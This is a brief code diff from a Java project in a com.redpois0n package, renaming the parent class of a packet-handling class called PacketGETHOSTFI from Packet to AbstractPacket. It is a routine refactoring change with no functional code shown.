@@ -8,7 +8,7 @@ import com.redpois0n.Connection;
 import com.redpois0n.common.os.OperatingSystem;
 
 
-public class PacketGETHOSTFI extends Packet {
+public class PacketGETHOSTFI extends AbstractPacket {
 
 	@Override
 	public void read(String line) throws Exception {
